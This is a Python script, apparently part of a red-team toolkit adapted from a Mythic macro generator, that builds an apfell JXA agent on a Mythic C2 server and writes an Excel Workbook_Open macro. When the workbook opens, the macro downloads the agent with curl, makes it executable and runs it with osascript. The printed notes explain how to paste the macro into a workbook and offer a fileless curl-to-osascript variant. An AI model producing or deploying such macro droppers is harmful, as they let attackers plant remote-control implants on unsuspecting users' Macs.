# Adapted from https://github.com/cedowens/Mythic-Macro-Generator

import asyncio, os
from .Utilities import *


def macro_excel():
    payload = "./Payloads/MacroExcel_Payload"
    # url = mythic_payload_url + "/Excel_Macro.js"   # Used for where the JXA paylaod is hosted

    os.mkdir(payload, 0o775)

    ## Create apfell payload
    async def scripting():
        print("[+] Logging into Mythic")
        mythic_instance = await login_mythic()
        print("[+] Creating new apfell payload")
        # define what our payload should be
        resp = await create_apfell_payload(mythic_instance=mythic_instance,
                                           description="Excel Macro",
                                           filename="Excel_Macro.js",
                                           include_all_commands=True)
        if resp["build_phase"] == "success":
            payload_info = await get_payload_data(mythic_instance=mythic_instance, payload_uuid=resp["uuid"])
            url = await get_payload_download_url(payload_info)
            # Download Payload
            payload_contents = await mythic.download_payload(mythic=mythic_instance, payload_uuid=resp["uuid"])
            pkg_payload = payload + "/Excel_Macro.js"
            with open(pkg_payload, "wb") as f:
                f.write(payload_contents)  # write out to disk

            macrofile = open(payload + '/macro.txt', 'w')
            # macrofile.write('Sub AutoOpen()\n')
            macrofile.write('Sub Workbook_Open()\n')
            macrofile.write("MacScript(\"do shell script \"\"curl -k %s -o excel.js\"\" \")" % url)
            macrofile.write("\n")
            macrofile.write("MacScript(\"do shell script \"\"chmod +x excel.js\"\"\")")
            macrofile.write("\n")
            macrofile.write("MacScript(\"do shell script \"\"osascript excel.js &\"\"\")")
            macrofile.write("\n")
            macrofile.write("End Sub")

            print("Note: \n"
                  "1) Copy the macro from Payloads/MacroExcel_Payload/macro.txt to past into Excel Workbook \n"
                  "2) When the macro is executed it will save to ~/Library/Containers/com.microsoft.Excel/Data/excel.js\n"
                  "3) You could replace command with 'curl -k 'URL' | osascript -l JavaScript &' to avoid disk writes but in testing this hangs the application")
        else:
            print(f"[-] Failed to build payload:  {resp['build_stderr']}\n{resp['build_message']}")

    async def main():
        await scripting()

    asyncio.run(main())
